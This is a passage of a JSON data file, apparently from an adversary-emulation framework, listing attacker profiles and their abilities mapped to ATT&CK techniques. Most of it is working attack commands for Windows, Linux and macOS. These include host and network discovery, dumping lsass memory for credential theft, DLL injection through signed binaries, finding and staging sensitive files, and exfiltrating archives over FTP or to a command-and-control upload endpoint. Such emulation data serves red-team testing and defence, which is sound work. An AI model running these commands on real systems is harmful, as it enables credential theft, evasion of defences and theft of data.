{"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["85341c8c-4ecb-4579-8f53-43e3e91d7617", "None", "remote.host.ip"], "possible_subsequent_abilities": []}, {"ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "ability_name": "System processes", "ability_description": "Identify system processes", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}, "donut_amd64": {"build_target": "ProcessDump.donut", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "ability_name": "Scan WIFI networks", "ability_description": "View all potential WIFI networks on host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "ability_name": "Preferred WIFI", "ability_description": "See the most used WIFI networks of a machine", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["a0676fe1-cd52-482e-8dde-349b73f9aa69", "None", "wifi.network.ssid"], "possible_subsequent_abilities": []}, {"ability_id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "ability_name": "Disrupt WIFI", "ability_description": "Turn a computers WIFI off", "ability_tactic": "impact", "ability_technique": {"attack_id": "T1499", "name": "Endpoint Denial of Service"}, "ability_platforms": {"darwin": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Off\n", "cleanup": ".\\wifi.ps1 -On\n", "payloads": ["wifi.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "fbc41624-1052-490c-b5ec-4fd718e2501d": {"adversary_name": "Advanced Thief via FTP", "adversary_description": "Find, stage, and exfiltrate sensitive files over FTP", "adversary_abilities_in_order": [{"ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "ability_description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "ability_tactic": "collection", "ability_technique": "None", "ability_platforms": "None", "id_dependence_fact_tuple -- (id, dependency, fact)": ["10fad81e-3f68-47be-83b6-fbee7711c6a9", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "ability_name": "Compress staged directory (Password Protected)", "ability_description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"linux": {"sh": {"command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n", "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh": {"command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.7z\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "d754878c-17dd-46dc-891c-a993f8a10336", "ability_name": "Exfil Compressed Archive to FTP Server", "ability_description": "This ability exfiltrates a compressed archive to an FTP server.", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1048.003", "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"}, "ability_platforms": {"linux": {"sh": {"command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'\n"}}, "windows": {"psh": {"command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://#{ftp.server.address}/$RemoteName\");\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n$ftp.Credentials = New-Object System.Net.NetworkCredential(\"#{ftp.user.name}\", \"#{ftp.user.password}\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n\n$content = [System.IO.File]::ReadAllBytes(\"#{host.dir.compress}\");\n$ftp.ContentLength = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content, 0, $content.Length);\n\n$requestStream.Close();\n$requestStream.Dispose();\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "bcdbf6b9-14c5-495c-be84-37bce32c312b": {"adversary_name": "Signed Binary Proxy Execution", "adversary_description": "Perform Signed Binary Proxy Execution", "adversary_abilities_in_order": [{"ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554", "ability_name": "Leverage Procdump for lsass memory", "ability_description": "Dump lsass for later use with mimikatz", "ability_tactic": "credential-access", "ability_technique": {"attack_id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}, "ability_platforms": {"windows": {"psh": {"command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "ability_name": "Signed Binary Execution - odbcconf", "ability_description": "Leverage odbcconf for DLL injection", "ability_tactic": "defense-evasion", "ability_technique": {"attack_id": "T1055.001", "name": "Process Injection: Dynamic-link Library Injection"}, "ability_platforms": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81", "ability_name": "Signed Binary Execution - Mavinject", "ability_description": "Leverage Mavinject (signed binary) for DLL injection", "ability_tactic": "defense-evasion", "ability_technique": {"attack_id": "T1055.002", "name": "Process Injection: Portable Executable Injection"}, "ability_platforms": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "de07f52d-9928-4071-9142-cb1d3bd851e8": {"adversary_name": "Ransack", "adversary_description": "Discover host details and steal sensitive files", "adversary_abilities_in_order": [{"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "c0da588f-79f0-4263-8998-7496b1a40596", "ability_name": "Identify active user", "ability_description": "Find user running agent", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["c0da588f-79f0-4263-8998-7496b1a40596", "None", "host.user.name"], "possible_subsequent_abilities": [["3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "host.user.name", "None"], ["3796a00b-b11d-4731-b4ca-275a07d83299", "host.user.name", "None"]]}, {"ability_id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "ability_name": "Find local users", "ability_description": "Get a list of all local users", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "ability_platforms": {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "feaced8f-f43f-452a-9500-a5219488abb8", "ability_name": "Identify local users", "ability_description": "Identify all local users", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "ability_platforms": {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "ability_name": "Snag broadcast IP", "ability_description": "Capture the local network broadcast IP address", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "ability_name": "Find user processes", "ability_description": "Get process info for processes running as a user", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "ability_name": "View admin shares", "ability_description": "Network Share Discovery", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "ability_platforms": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "custom_parser_vals": {"json_key": "Path", "json_type": "str"}}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["530e47c6-8592-42bf-91df-c59ffbd8541b", "None", "domain.smb.share"], "possible_subsequent_abilities": []}, {"ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "ability_name": "Discover domain controller", "ability_description": "Identify the remote domain controllers", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba", "ability_name": "Discover antivirus programs", "ability_description": "Identify AV", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["2dece965-37a0-4f70-a391-0f30e3331aba", "None", "host.installed.av"], "possible_subsequent_abilities": []}, {"ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "ability_name": "Permission Groups Discovery", "ability_description": "Summary of permission and security groups", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1069.001", "name": "Permission Groups Discovery: Local Groups"}, "ability_platforms": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "ability_name": "Identify Firewalls", "ability_description": "Identify Firewalls", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "ability_name": "Discover Mail Server", "ability_description": "Identify the organizations mail server", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["ce485320-41a4-42e8-a510-f5a8fe96a644", "None", "target.org.emailhost"], "possible_subsequent_abilities": []}, {"ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "ability_name": "Get Chrome Bookmarks", "ability_description": "Get Chrome Bookmarks", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "ability_name": "Create staging directory", "ability_description": "create a directory for exfil staging", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["6469befa-748a-4b9c-a96d-f191fde47d89", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "ability_name": "Stage sensitive files", "ability_description": "copy files to staging directory", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ability_name": "Compress staged directory", "ability_description": "Compress a directory on the file system", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "ability_name": "Exfil staged directory", "ability_description": "Exfil the staged directory", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1041", "name": "Exfiltration Over C2 Channel"}, "ability_platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "01c96671-afd3-47d4-8d31-8c116cc0221a": {"adversary_name": "Advanced Thief via DropBox", "adversary_description": "Find, stage, and exfiltrate sensitive files over DropBox", "adversary_abilities_in_order": [{"ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "ability_description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "ability_tactic": "collection", "ability_technique": "None", "ability_platforms": "None", "id_dependence_fact_tuple -- (id, dependency, fact)": 